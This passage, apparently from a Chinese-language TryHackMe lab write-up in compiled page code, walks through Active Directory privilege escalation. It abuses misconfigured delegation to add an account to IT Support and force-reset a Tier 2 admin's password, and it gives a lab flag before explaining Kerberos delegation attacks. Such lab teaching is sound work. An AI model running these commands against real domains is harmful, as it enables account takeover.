\u662f\u5426\u6709\u53ef\u80fd\u627e\u5230\u4e00\u6761\u8def\u5f84\u6765\u653b\u51fb\u8fd9\u4e2a\u7ec4\u3002\u5c06\u4f60\u7684\u7528\u6237\u8d26\u6237\u4f5c\u4e3a\u8d77\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u5c42\u7ba1\u7406\u5458\u7ec4\u4f5c\u4e3a\u7ec8\u6b62\u4f4d\u7f6e\u6dfb\u52a0\u8fdb\u53bb\u3002"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Bloodhound \u9488\u5bf9\u57fa\u7840\u8bbe\u65bd\u641c\u7d22 \u653b\u51fb\u8def\u5f84",src:i(2344).Z+"",width:"1164",height:"706"})})}),"\n",(0,r.jsx)(n.p,{children:"Bloodhound \u663e\u793a\u4e86\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u8def\u5f84\u3002\u770b\u8d77\u6765\u5728\u8fd9\u4e2a\u57df\u4e2d\u6709\u4e00\u70b9\u70b9\u6743\u9650\u59d4\u6d3e\u3002\u4e00\u4e2a\u7ba1\u7406\u5458\u901a\u8fc7\u4e3a IT \u652f\u6301\u7ec4\u63d0\u4f9b\u4e86\u5bf9 Domain Users \u7ec4\u7684 AddMembers ACE \u6765\u9519\u8bef\u914d\u7f6e\u4e86\u6743\u9650\u59d4\u6d3e\u3002\u8fd9\u610f\u5473\u7740 Domain Users \u7ec4\u7684\u4efb\u4f55\u6210\u5458\uff08\u5305\u62ec\u6211\u4eec\u7684\u8d26\u6237\uff09\u90fd\u53ef\u4ee5\u5c06\u5e10\u6237\u6dfb\u52a0\u5230 IT \u652f\u6301\u7ec4\u4e2d\u3002\u6b64\u5916\uff0cBloodhound \u663e\u793a IT \u652f\u6301\u7ec4\u5bf9\u4e8e\u7b2c\u4e8c\u5c42\u7ba1\u7406\u5458\u7ec4\u6210\u5458\u6709 ForceChangePassword ACE\u3002\u8fd9\u4e0d\u662f\u771f\u6b63\u7684\u914d\u7f6e\u9519\u8bef\uff0c\u56e0\u4e3a\u7b2c\u4e8c\u5c42\u7ba1\u7406\u5458\u5e76\u4e0d\u90a3\u4e48\u654f\u611f\uff0c\u4f46\u5f53\u4e0e\u6700\u521d\u7684\u9519\u8bef\u914d\u7f6e\u7ed3\u5408\u65f6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u6761\u975e\u5e38\u6709\u6548\u7684\u653b\u51fb\u8def\u5f84\u3002\u8ba9\u6211\u4eec\u5229\u7528\u5b83\uff01"}),"\n",(0,r.jsx)(n.h3,{id:"addmember---\u6dfb\u52a0\u6210\u5458",children:"AddMember - \u6dfb\u52a0\u6210\u5458"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u653b\u51fb\u8def\u5f84\u7684\u7b2c\u4e00\u6b65\u662f\u5c06\u6211\u4eec\u7684 AD \u8d26\u6237\u6dfb\u52a0\u5230 IT \u652f\u6301\u7ec4\u3002\u6211\u4eec\u5c06\u4f7f\u7528 AD-RSAT \u5de5\u5177\u96c6\u4e2d\u7684 Add-ADGroupMember PowerShell cmdlet \u6765\u5b9e\u73b0\u3002\u5728 THMJMP1 \u4e3b\u673a\u4e0a\u542f\u52a8 PowerShell\uff08\u65e0\u8bba\u662f\u901a\u8fc7 RDP \u8fd8\u662f\u901a\u8fc7 SSH\uff09\uff0c\u5e76\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u6dfb\u52a0\u4f60\u7684\u8d26\u6237\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",metastring:'title="PowerShell"',children:'PS C:\\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Get-ADGroupMember \u547d\u4ee4\u6765\u9a8c\u8bc1\u547d\u4ee4\u662f\u5426\u751f\u6548\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",metastring:'title="PowerShell"',children:'PS C:\\>Get-ADGroupMember -Identity "IT Support"\ndistinguishedName : CN=hugh.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc\nname              : hugh.jones\nobjectClass       : user\nobjectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779\nSamAccountName    : hugh.jones\nSID               : S-1-5-21-3885271727-2693558621-2658995185-1113\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u4e00\u5207\u987a\u5229\uff0c\u4f60\u5e94\u8be5\u80fd\u770b\u5230\u4f60\u7684\u8d26\u6237\u4f5c\u4e3a\u6210\u5458\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u5f3a\u5236\u66f4\u6539\u5bc6\u7801",children:"\u5f3a\u5236\u66f4\u6539\u5bc6\u7801"}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u662f IT \u652f\u6301\u7ec4\u7684\u6210\u5458\uff0c\u6211\u4eec\u5df2\u7ecf\u7ee7\u627f\u4e86\u5bf9\u7b2c\u4e8c\u5c42\u7ba1\u7406\u5458\u7ec4\u7684 ForceChangePassword \u6743\u9650\u59d4\u6d3e\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u8bc6\u522b\u8fd9\u4e2a\u7ec4\u7684\u6210\u5458\u4ee5\u9009\u62e9\u4e00\u4e2a\u76ee\u6807\u3002\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u4f7f\u7528 Get-ADGroupMember \u547d\u4ee4\u6765\u8f85\u52a9\u8fdb\u884c\u8fd9\u9879\u5de5\u4f5c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'PS C:\\>Get-ADGroupMember -Identity "Tier 2 Admins"\ndistinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc\nname              : t2_lawrence.lewis\nobjectClass       : user\nobjectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828\nSamAccountName    : t2_lawrence.lewis\nSID               : S-1-5-21-3885271727-2693558621-2658995185-1893\n\n[....]\n\ndistinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc\nname              : t2_leon.francis\nobjectClass       : user\nobjectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9\nSamAccountName    : t2_leon.francis\nSID               : S-1-5-21-3885271727-2693558621-2658995185-3660\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u8bb0\u4e0b\u5176\u4e2d\u4e00\u4e2a\u8d26\u6237\u7684\u7528\u6237\u540d\u3002\u7531\u4e8e\u7f51\u7edc\u662f\u5171\u4eab\u7684\uff0c\u6700\u597d\u9009\u62e9\u5217\u8868\u4e2d\u7684\u540e\u9762\u4e00\u4e2a\u3002\u6211\u4eec\u5c06\u4f7f\u7528 Set-ADAccountPassword AD-RSAT cmdlet \u6765\u5f3a\u5236\u66f4\u6539\u5bc6\u7801\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'PS C:\\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force\nPS C:\\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password\n'})}),"\n",(0,r.jsx)(n.admonition,{type:"tip",children:(0,r.jsxs)(n.p,{children:["\u5982\u679c\u51fa\u73b0 \u201c\u62d2\u7edd\u8bbf\u95ee\u201d \u9519\u8bef\uff0c\u4f60\u7684\u6743\u9650\u53ef\u80fd\u8fd8\u6ca1\u6709\u5728\u57df\u4e2d\u4f20\u64ad\u3002\u8fd9\u53ef\u80fd\u9700\u8981\u6700\u591a 10 \u5206\u949f\u7684\u65f6\u95f4\u3002\u6700\u597d\u7684\u65b9\u6cd5\u662f\u7ec8\u6b62\u4f60\u7684 SSH \u6216 RDP \u4f1a\u8bdd\uff0c\u7a0d\u4f5c\u4f11\u606f\uff0c\u7136\u540e\u91cd\u65b0\u8ba4\u8bc1\u5e76\u91cd\u8bd5\u3002\u4f60\u4e5f\u53ef\u4ee5\u8fd0\u884c ",(0,r.jsx)(n.code,{children:"gpupdate /force"}),"\uff0c\u7136\u540e\u65ad\u5f00\u8fde\u63a5\u5e76\u91cd\u65b0\u8fde\u63a5\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u8fd9\u6837\u505a\u4f1a\u52a0\u5feb\u540c\u6b65\u7684\u901f\u5ea6\u3002"]})}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u8fd9\u4e00\u6b65\u6210\u529f\u4e86\uff0c\u4f60\u73b0\u5728\u5e94\u8be5\u80fd\u591f\u4f7f\u7528\u8fd9\u4e2a\u76ee\u6807\u8d26\u6237\u548c\u5b83\u7684\u65b0\u5bc6\u7801\u5728 THMWRK1 \u4e0a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u4f60\u76ee\u524d\u5177\u6709\u5bf9\u8fd9\u53f0\u5de5\u4f5c\u7ad9\u7684\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u606d\u559c\u4f60\uff01\u901a\u8fc7\u5229\u7528\u6743\u9650\u59d4\u6d3e\uff0c\u4f60\u5df2\u6b63\u5f0f\u5c06\u6743\u9650\u63d0\u5347\u5230\u4e86\u7b2c\u4e8c\u5c42\u7ba1\u7406\u5458\u3002"}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u54ea\u4e2a ACE \u5141\u8bb8\u60a8\u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u7684\u4efb\u4f55\u4e0d\u53d7\u4fdd\u62a4\u7684\u53c2\u6570\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"GenericWrite\n"})}),(0,r.jsx)(n.p,{children:"THMWRK1 \u4e0a\u7ba1\u7406\u5458\u7528\u6237\u684c\u9762\u4e0a\u5b58\u50a8\u7684\u6807\u5fd7\u503c\u662f\u591a\u5c11 (flag1.txt)\uff1f"}),(0,r.jsxs)(t,{children:[(0,r.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,r.jsx)(n.p,{children:"\u5728\u901a\u8fc7 SSH \u8fde\u63a5\u5230 thmwrk1 \u4e4b\u540e"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"ssh za.tryhackme.loc\\\\christopher.smith@thmwrk1.za.tryhackme.loc\n"})}),(0,r.jsxs)(n.p,{children:["\u5207\u6362\u5230 powershell\uff0c\u5e76\u5c06\u81ea\u8eab\u8d26\u6237\u52a0\u5165\u5230 ",(0,r.jsx)(n.code,{children:"IT Support"})," \u7528\u6237\u7ec4\u91cc\u9762"]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'PS C:\\Users\\christopher.smith> Add-ADGroupMember "IT Support" -Members "christopher.smith"\n'})}),(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u6307\u4ee4\u68c0\u67e5 ",(0,r.jsx)(n.code,{children:"IT Support"})," \u7528\u6237\u7ec4\u5185\u662f\u5426\u6709\u81ea\u5df1\u7684\u8d26\u6237"]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'Get-ADGroupMember -Identity "IT Support"\n'})}),(0,r.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\u5728\u4e8c\u7ea7\u7ba1\u7406\u5458\u7ec4\u91cc\u9762\u6311\u9009\u4e00\u540d\u53d7\u5bb3\u7528\u6237\uff0c\u5e76\u66f4\u6539\u5176\u7528\u6237\u5bc6\u7801"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'PS C:\\Users\\christopher.smith> Get-ADGroupMember -Identity "Tier 2 Admins"\n......\ndistinguishedName : CN=t2_melanie.davies,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc\nname              : t2_melanie.davies\nobjectClass       : user\nobjectGUID        : c9625ed3-0391-40ba-9c6d-b4046049c434\nSamAccountName    : t2_melanie.davies\nSID               : S-1-5-21-3885271727-2693558621-2658995185-5929\n\nPS C:\\Users\\christopher.smith> $Password = ConvertTo-SecureString "admin12345ABC" -AsPlainText -Force\nPS C:\\Users\\christopher.smith> Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password\n'})}),(0,r.jsx)(n.p,{children:"\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 SSH \u767b\u5f55\u5230\u6b64\u8d26\u6237"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"ssh za.tryhackme.loc\\\\t2_melanie.davies@thmwrk1.za.tryhackme.loc\n"})}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"za\\t2_melanie.davies@THMWRK1 C:\\Users\\Administrator\\Desktop>whoami\nza\\t2_melanie.davies\nza\\t2_melanie.davies@THMWRK1 C:\\Users\\Administrator\\Desktop>type flag1.txt\nTHM{Permission.Delegation.FTW!}\n"})})]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{Permission.Delegation.FTW!}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-kerberos-delegation---\u5229\u7528-kerberos-\u59d4\u6d3e",children:"Exploiting Kerberos Delegation - \u5229\u7528 Kerberos \u59d4\u6d3e"}),"\n",(0,r.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06\u770b\u770b Kerberos \u59d4\u6d3e\u3002\u5f53\u8c08\u8bba AD \u59d4\u6d3e\u65f6\uff0c\u901a\u5e38\u8ba8\u8bba\u7684\u662f Kerberos \u59d4\u6d3e\uff0c\u800c\u4e0d\u662f\u6743\u9650\u59d4\u6d3e\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"kerberos-\u59d4\u6d3e",children:"Kerberos \u59d4\u6d3e"}),"\n",(0,r.jsx)(n.p,{children:"Kerberos \u59d4\u6d3e\u7684\u5b9e\u9645\u7528\u9014\u662f\u4f7f\u5e94\u7528\u7a0b\u5e8f\u80fd\u591f\u8bbf\u95ee\u6258\u7ba1\u5728\u4e0d\u540c\u670d\u52a1\u5668\u4e0a\u7684\u8d44\u6e90\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a Web \u670d\u52a1\u5668\u9700\u8981\u8bbf\u95ee\u6258\u7ba1\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u7684 SQL \u6570\u636e\u5e93\uff0c\u4ee5\u4f9b\u5176\u6258\u7ba1\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002\u5982\u679c\u6ca1\u6709\u59d4\u6d3e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u4e2a AD \u670d\u52a1\u8d26\u6237\uff0c\u5e76\u76f4\u63a5\u6388\u4e88\u5b83\u5bf9\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u6743\u9650\u3002\u5f53\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u4e0a\u8fdb\u884c\u8bf7\u6c42\u65f6\uff0c\u670d\u52a1\u8d26\u6237\u5c06\u7528\u4e8e\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u548c\u68c0\u7d22\u4fe1\u606f\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5141\u8bb8\u8be5\u670d\u52a1\u8d26\u6237\u88ab\u59d4\u6d3e\u5230 SQL \u670d\u52a1\u5668\u670d\u52a1\u3002\u4e00\u65e6\u7528\u6237\u767b\u5f55\u5230\u6211\u4eec\u7684 Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u8d26\u6237\u5c06\u4ee3\u8868\u8be5\u7528\u6237\u8bf7\u6c42\u8bbf\u95ee\u6570\u636e\u5e93\u3002\u8fd9\u610f\u5473\u7740\u7528\u6237\u53ea\u80fd\u8bbf\u95ee\u4ed6\u4eec\u5177\u6709\u76f8\u5173\u6743\u9650\u7684\u6570\u636e\u5e93\u6570\u636e\uff0c\u800c\u65e0\u9700\u4e3a\u670d\u52a1\u8d26\u6237\u672c\u8eab\u63d0\u4f9b\u4efb\u4f55\u6570\u636e\u5e93\u7279\u6743\u6216\u6743\u9650\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u53d7\u7ea6\u675f\u4e0e\u65e0\u7ea6\u675f",children:"\u53d7\u7ea6\u675f\u4e0e\u65e0\u7ea6\u675f"}),"\n",(0,r.jsxs)(n.p,{children:["\u6709\u4e24\u79cd\u7c7b\u578b\u7684 Kerberos \u59d4\u6d3e\u3002\u5728 Kerberos \u59d4\u6d3e\u7684\u6700\u521d\u5b9e\u73b0\u4e2d\uff0c\u4f7f\u7528\u7684\u662f Unconstrained Delegation \uff08\u65e0\u7ea6\u675f\u59d4\u6d3e\uff09\uff0c\u8fd9\u662f\u6700\u4e0d\u5b89\u5168\u7684\u65b9\u6cd5\u3002\u5b9e\u8d28\u4e0a\uff0cUnconstrained Delegation \u6ca1\u6709\u5bf9\u59d4\u6d3e\u8bbe\u7f6e\u4efb\u4f55\u9650\u5236\u3002\u5728\u80cc\u666f\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u8bbe\u7f6e\u4e86 \u201cTRUSTED_FOR_DELEGATION\u201d \u6807\u5fd7\u7684\u7528\u6237\u5728\u5177\u6709 Unconstrained Delegation \u914d\u7f6e\u7684\u4e3b\u673a\u4e0a\u8fdb\u884c\u4e86\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5c31\u4f1a\u751f\u6210\u5e76\u5b58\u50a8\u8be5\u7528\u6237\u8d26\u6237\u7684\u7968\u636e\u6388\u6743\u7968\u8bc1\uff08TGT\uff09\uff0c\u4ee5\u4fbf\u4ee5\u540e\u9700\u8981\u65f6\u4f7f\u7528\u3002\u5047\u8bbe\u653b\u51fb\u8005\u80fd\u591f\u5165\u4fb5\u4e00\u4e2a\u542f\u7528\u4e86 Unconstrained Delegation \u7684\u4e3b\u673a\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8feb\u4f7f\u4e00\u4e2a\u7279\u6743\u5e10\u6237\u5bf9\u4e3b\u673a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u8fd9\u5c06\u5141\u8bb8\u4ed6\u4eec\u62e6\u622a\u751f\u6210\u7684 TGT \u5e76\u5192\u5145\u7279\u6743\u670d\u52a1\u3002\u5982\u679c\u4f60\u60f3\u770b\u4e00\u4e2a\u5173\u4e8e Unconstrained Delegation \u6f0f\u6d1e\u5229\u7528\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u770b ",(0,r.jsx)(n.a,{href:"https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976",children:"Exploiting Unconstrained Delegation"})," \u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u89e3\u51b3 Unconstrained Delegation \u7684\u5b89\u5168\u95ee\u9898\uff0cMicrosoft \u5728 2003 \u5e74\u5f15\u5165\u4e86 Constrained Delegation \uff08\u7ea6\u675f\u59d4\u6d3e\uff09\u3002Constrained Delegation \u9650\u5236\u4e86\u4e00\u4e2a\u5e10\u6237\u53ef\u4ee5\u88ab\u59d4\u6d3e\u5230\u54ea\u4e9b\u670d\u52a1\uff0c\u4ece\u800c\u5728\u5e10\u6237\u5728\u906d\u9047\u5165\u4fb5\u65f6\u9650\u5236\u4e86\u66b4\u9732\u7684\u8303\u56f4\u3002\u4ee5\u4e0b\u662f\u53ef\u4ee5\u914d\u7f6e\u59d4\u6d3e\u7684\u4e00\u4e9b\u793a\u4f8b\u670d\u52a1\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"HTTP\uff1a\u7528\u4e8e Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u5141\u8bb8\u4f7f\u7528 AD \u51ed\u636e\u8fdb\u884c\u900f\u4f20\u8eab\u4efd\u9a8c\u8bc1\u3002"}),"\n",(0,r.jsx)(n.li,{children:"CIFS\uff1a\u7528\u4e8e\u6587\u4ef6\u5171\u4eab\u7684 Common Internet File System\uff0c\u5141\u8bb8\u7528\u6237\u59d4\u6d3e\u5230\u5171\u4eab\u3002"}),"\n",(0,r.jsx)(n.li,{children:"LDAP\uff1a\u7528\u4e8e\u5411 LDAP \u670d\u52a1\u59d4\u6d3e\uff0c\u6bd4\u5982\u91cd\u7f6e\u7528\u6237\u5bc6\u7801\u7b49\u64cd\u4f5c\u3002"}),"\n",(0,r.jsx)(n.li,{children:"HOST\uff1a\u5141\u8bb8\u5728\u4e3b\u673a\u4e0a\u8fdb\u884c\u6240\u6709\u6d3b\u52a8\u7684\u5e10\u6237\u59d4\u6d3e\u3002"}),"\n",(0,r.jsx)(n.li,{children:"MSSQL\uff1a\u5141\u8bb8\u5c06\u7528\u6237\u5e10\u6237\u59d4\u6d3e\u7ed9 SQL \u670d\u52a1\uff0c\u4ee5\u8fdb\u884c\u5bf9\u6570\u636e\u5e93\u7684\u900f\u4f20\u8eab\u4efd\u9a8c\u8bc1\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u5229\u7528 Constrained Delegation \u901a\u5e38\u6bd4\u5229\u7528 Unconstrained Delegation \u66f4\u590d\u6742\uff0c\u56e0\u4e3a\u88ab\u59d4\u6d3e\u7684\u5e10\u6237\u4e0d\u80fd\u88ab\u7528\u4e8e\u6240\u6709\u6d3b\u52a8\u3002\u7136\u800c\uff0c\u5b83\u4ecd\u7136\u53ef\u4ee5\u7528\u4e8e\u4e00\u4e9b\u5f3a\u5927\u7684\u5229\u7528\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u80fd\u591f\u5165\u4fb5\u4e00\u4e2a\u914d\u7f6e\u4e86 Constrained Delegation \u7684 AD \u8d26\u6237\u3002\u901a\u8fc7\u77e5\u9053\u8fd9\u4e2a\u8d26\u6237\u7684\u660e\u6587\u5bc6\u7801\u751a\u81f3\u53ea\u662f NTLM \u54c8\u5e0c\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u8fd9\u4e2a\u8d26\u6237\u751f\u6210\u4e00\u4e2a TGT\uff0c\u7136\u540e\u4f7f\u7528\u8be5 TGT \u5bf9\u4efb\u4f55\u975e\u654f\u611f\u7528\u6237\u8d26\u6237\u6267\u884c\u7968\u636e\u6388\u6743\u670d\u52a1\u5668\uff08TGS\uff09\u8bf7\u6c42\uff0c\u4ee5\u4fbf\u4f5c\u4e3a\u8be5\u7528\u6237\u8bbf\u95ee\u670d\u52a1\u3002\u60f3\u8c61\u4e00\u4e0b\u5192\u5145\u4e00\u4e2a\u53ef\u4ee5\u8bbf\u95ee\u654f\u611f\u6570\u636e\u5e93\u7684\u8d26\u6237\u7684\u60c5\u51b5\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u57fa\u4e8e\u8d44\u6e90\u7684\u59d4\u6d3e",children:"\u57fa\u4e8e\u8d44\u6e90\u7684\u59d4\u6d3e"}),"\n",(0,r.jsx)(n.p,{children:"\u5176\u5b9e\u6709\u4e09\u79cd\u7c7b\u578b\u7684 Kerberos \u59d4\u6d3e\u3002\u4f46 Resource-Based Constrained Delegation\uff08RBCD\uff09\u975e\u5e38\u503c\u5f97\u5355\u72ec\u63d0\u53ca\u3002\u7531 Microsoft \u5728 2012 \u5e74\u5f15\u5165\uff0cRBCD \u518d\u6b21\u4e3a Kerberos \u59d4\u6d3e\u589e\u52a0\u4e86\u989d\u5916\u7684\u5b89\u5168\u9650\u5236\u3002RBCD \u5b8c\u5168\u6539\u53d8\u4e86\u59d4\u6d3e\u6a21\u578b\u3002\u4e0d\u518d\u662f\u6307\u5b9a\u54ea\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u59d4\u6d3e\u7ed9\u54ea\u4e2a\u670d\u52a1\uff0c\u800c\u662f\u670d\u52a1\u73b0\u5728\u6307\u5b9a\u4e86\u54ea\u4e9b\u5bf9\u8c61\u53ef\u4ee5\u59d4\u6d3e\u7ed9\u5b83\u3002\u8fd9\u4f7f\u5f97\u670d\u52a1\u6240\u6709\u8005\u80fd\u591f\u63a7\u5236\u8c01\u53ef\u4ee5\u8bbf\u95ee\u5b83\u3002\u5728\u6211\u4eec\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u793a\u4f8b\u4e2d\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u4e0d\u518d\u9700\u8981\u6307\u5b9a Web \u670d\u52a1\u5e10\u6237\u53ef\u4ee5\u59d4\u6d3e\u7ed9\u6570\u636e\u5e93\u670d\u52a1\u4ee5\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u800c\u662f\u53ef\u4ee5\u5728\u6570\u636e\u5e93\u670d\u52a1\u4e0a\u6307\u5b9a\u5141\u8bb8 Web \u670d\u52a1\u5e10\u6237\u59d4\u6d3e\u8bbf\u95ee\u5b83\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u5047\u8bbe\u6211\u4eec\u6709\u6743\u9650\u4e3a\u4e00\u4e2a\u670d\u52a1\u914d\u7f6e RBCD\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u6709\u80fd\u529b\u4e3a AD \u5bf9\u8c61\u8bbe\u7f6e msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u3002\u6211\u4eec\u53ef\u4ee5\u7528\u6211\u4eec\u8bbf\u95ee\u6743\u9650\u7684 AD \u8d26\u6237\u7684\u8be6\u7ec6\u4fe1\u606f\u586b\u5145\u8fd9\u4e2a\u5c5e\u6027\u3002\u73b0\u5728\uff0c\u4e3a\u4e86\u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u6211\u4eec\u63a7\u5236\u7684\u8d26\u6237\u751f\u6210\u4e00\u4e2a TGT\uff0c\u8fd9\u5c06\u5141\u8bb8\u6211\u4eec\u4e0e\u8fd9\u4e2a\u670d\u52a1\u4ea4\u4e92\u3002\u5982\u679c\u4f60\u60f3\u4e86\u89e3 RBCD \u5229\u7528\u7684\u8be6\u7ec6\u793a\u4f8b\uff0c\u53ef\u4ee5\u770b ",(0,r.jsx)(n.a,{href:"https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/",children:"Resource-Based Constrained Delegation Abuse"})," \u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"\u9488\u5bf9\u53d7\u9650\u59d4\u6258\u7684\u5229\u7528",children:"\u9488\u5bf9\u53d7\u9650\u59d4\u6258\u7684\u5229\u7528"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u5c06\u5229\u7528 Constrained Delegation \u6765\u5b8c\u6210\u8fd9\u4e2a\u4efb\u52a1\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u679a\u4e3e\u53ef\u7528\u7684\u59d4\u6d3e\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u7684\u65b0\u7279\u6743\u7528\u6237\u5728\u7f51\u7edc\u4e0a\u8fd0\u884c\u4e00\u4e9b\u547d\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 PowerSploit \u7684 Get-NetUser \u547d\u4ee4\u6765\u8fdb\u884c\u8fd9\u4e2a\u679a\u4e3e\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="PowerShell"',children:"PS C:\\>Import-Module C:\\Tools\\PowerView.ps1\nPS C:\\>Get-NetUser -TrustedToAuth\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6839\u636e\u8fd9\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 svcIIS \u8d26\u6237\u53ef\u4ee5\u59d4\u6d3e THMSERVER1 \u4e0a\u7684 HTTP \u548c WSMAN \u670d\u52a1\u3002\u4f60\u53ef\u80fd\u4f1a\u8ba4\u4e3a\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ea\u80fd\u4ee3\u8868\u6a21\u62df\u7528\u6237\u8bbf\u95ee\u7f51\u7ad9\u3002\u7136\u800c\uff0cPowerShell \u8fdc\u7a0b\u7ba1\u7406\u4e5f\u4f7f\u7528 HTTP \u548c WSMAN \u670d\u52a1\u3002\u7406\u60f3\u7684\u9009\u62e9\u662f\u5192\u5145\u4e00\u4e2a\u7b2c\u4e00\u5c42\u7ba1\u7406\u5458\uff0c\u56e0\u4e3a\u8fd9\u5c06\u4e3a\u6211\u4eec\u63d0\u4f9b\u5bf9 THMSERVER1 \u7684\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u4f60\u5bf9 THMWRK1 